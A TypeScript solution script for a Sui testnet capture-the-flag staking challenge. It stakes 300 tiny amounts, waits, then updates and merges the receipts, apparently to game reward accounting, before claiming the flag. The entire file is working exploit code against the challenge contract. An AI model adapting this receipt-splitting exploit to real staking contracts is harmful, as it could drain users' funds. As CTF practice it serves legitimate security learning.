import { SuiGrpcClient } from '@mysten/sui/grpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import { Transaction } from '@mysten/sui/transactions';
import keyPairJson from "../keypair.json" with { type: "json" };

const keypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);
const client = new SuiGrpcClient({ network: 'testnet', baseUrl: 'https://fullnode.testnet.sui.io:443' });
const address = keypair.toSuiAddress();

const CTF_PACKAGE = '0x936313e502e9cbf6e7a04fe2aeb4c60bc0acd69729acc7a19921b33bebf72d03';
const CLOCK_OBJECT = '0x6';
const STAKE_AMOUNT = 1;
const MIN_CLAIM_AMOUNT = 1_000_000_000;
const STAKE_TYPE = `${CTF_PACKAGE}::staking::StakeReceipt`;
const NUM_TINY_RECEIPTS = 300;
const WAIT_HOURS = 1;
const RPC = 'https://fullnode.testnet.sui.io';

async function rpc(method: string, params: unknown[]) {
  const res = await fetch(RPC, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  });
  const json = await res.json() as any;
  if (json.error) throw new Error(`RPC error: ${JSON.stringify(json.error)}`);
  return json.result;
}

async function waitForTx(digest: string) {
  for (let i = 0; i < 30; i++) {
    await new Promise(r => setTimeout(r, 1000));
    try {
      const result = await rpc('sui_getTransactionBlock', [digest, { showEffects: true }]);
      if (result?.effects?.status?.status === 'success') return;
      if (result?.effects?.status?.status === 'failure') {
        throw new Error(`TX failed: ${result.effects.status.error}`);
      }
    } catch (e: any) {
      if (!e.message?.includes('not find')) throw e;
    }
  }
}

async function execute(tx: Transaction): Promise<string> {
  const res = await client.signAndExecuteTransaction({ transaction: tx, signer: keypair });
  const digest = res.digest ?? (res as any).Transaction?.digest;
  if (!digest) throw new Error('No digest returned: ' + JSON.stringify(res));
  await waitForTx(digest);
  return digest;
}

async function getStakingPoolId(): Promise<string> {
  const result = await rpc('sui_getTransactionBlock', [
    'FDM3FUBJStmycZp1tb7ucVH7oA66iVo1uVHoy1iA8he1',
    { showObjectChanges: true }
  ]);
  const created = result?.objectChanges?.find(
    (c: any) => c.type === 'created' && c.objectType === `${CTF_PACKAGE}::staking::StakingPool`
  );
  if (!created) throw new Error('StakingPool not found in publish tx');
  return created.objectId;
}

async function getMyReceipts(): Promise<string[]> {
  const result = await rpc('suix_getOwnedObjects', [
    address,
    { filter: { StructType: STAKE_TYPE }, options: { showContent: true } },
    null,
    50
  ]);
  return (result?.data ?? []).map((obj: any) => obj.data?.objectId).filter(Boolean);
}

async function logBalance() {
  const result = await rpc('suix_getCoins', [address, '0x2::sui::SUI', null, 10]);
  const coins = result?.data ?? [];
  const total = coins.reduce((s: number, c: any) => s + parseInt(c.balance), 0);
  console.log(`  Wallet: ${(total / 1e9).toFixed(4)} SUI across ${coins.length} coin(s)`);
}

async function createReceipts(poolId: string): Promise<void> {
  console.log(`\n[STEP 1] Creating tiny receipts...`);
  await logBalance();

  const existing = await getMyReceipts();
  console.log(`  Found ${existing.length} existing receipt(s) — creating ${NUM_TINY_RECEIPTS} more`);

  const BATCH = 10;
  let done = 0;
  while (done < NUM_TINY_RECEIPTS) {
    const batch = Math.min(BATCH, NUM_TINY_RECEIPTS - done);
    const tx = new Transaction();
    for (let i = 0; i < batch; i++) {
      const [splitCoin] = tx.splitCoins(tx.gas, [STAKE_AMOUNT]);
      const [receipt] = tx.moveCall({
        target: `${CTF_PACKAGE}::staking::stake`,
        arguments: [tx.object(poolId), splitCoin, tx.object(CLOCK_OBJECT)],
      });
      tx.transferObjects([receipt], address);
    }
    const digest = await execute(tx);
    done += batch;
    console.log(`  ✓ Tiny receipts: ${done}/${NUM_TINY_RECEIPTS} (tx: ${digest})`);
  }

  const readyAt = new Date(Date.now() + WAIT_HOURS * 3_600_000);
  console.log(`\n✅ Done! Come back after: ${readyAt.toLocaleString()}`);
  console.log(`   Then run: pnpm staking merge`);
}

async function mergeReceipts(): Promise<void> {
  console.log('\n[STEP 2] Updating and merging receipts...');

  const receiptIds = await getMyReceipts();
  console.log(`  Found ${receiptIds.length} receipts`);
  if (!receiptIds.length) throw new Error('No receipts found. Run stake first.');

  for (let i = 0; i < receiptIds.length; i++) {
    const tx = new Transaction();
    const [updated] = tx.moveCall({
      target: `${CTF_PACKAGE}::staking::update_receipt`,
      arguments: [tx.object(receiptIds[i]), tx.object(CLOCK_OBJECT)],
    });
    tx.transferObjects([updated], address);
    const digest = await execute(tx);
    console.log(`  ✓ Updated ${i + 1}/${receiptIds.length} (tx: ${digest})`);
  }

  let current = await getMyReceipts();
  console.log(`\n  Merging ${current.length} receipts...`);
  while (current.length > 1) {
    const tx = new Transaction();
    const [merged] = tx.moveCall({
      target: `${CTF_PACKAGE}::staking::merge_receipts`,
      arguments: [tx.object(current[0]), tx.object(current[1]), tx.object(CLOCK_OBJECT)],
    });
    tx.transferObjects([merged], address);
    const digest = await execute(tx);
    current = await getMyReceipts();
    console.log(`  ✓ ${current.length} receipt(s) remaining (tx: ${digest})`);
  }

  console.log('\n✅ Merged! Run: pnpm staking claim');
}

async function claimFlag(poolId: string): Promise<void> {
  console.log('\n[STEP 3] Claiming flag...');
  const receipts = await getMyReceipts();
  if (!receipts.length) throw new Error('No receipt found. Run stake → merge first.');

  const tx = new Transaction();
  const [flag, coin] = tx.moveCall({
    target: `${CTF_PACKAGE}::staking::claim_flag`,
    arguments: [tx.object(poolId), tx.object(receipts[0]), tx.object(CLOCK_OBJECT)],
  });
  tx.transferObjects([flag, coin], address);
  const digest = await execute(tx);

  console.log('\n🚩 FLAG CAPTURED!');
  console.log(`   TX: ${digest}`);
  console.log(`   https://suiscan.xyz/testnet/tx/${digest}`);
}

(async () => {
  const mode = process.argv[2] ?? 'help';
  console.log(`\nSui CTF — Staking Exploit | ${address}`);
  const poolId = await getStakingPoolId();
  console.log(`StakingPool: ${poolId}\n`);

  if (mode === 'stake') await createReceipts(poolId);
  else if (mode === 'merge') await mergeReceipts();
  else if (mode === 'claim') await claimFlag(poolId);
  else console.log('Usage: pnpm staking [stake|merge|claim]');
})().catch(err => { console.error('\n❌', err.message ?? err); process.exit(1); });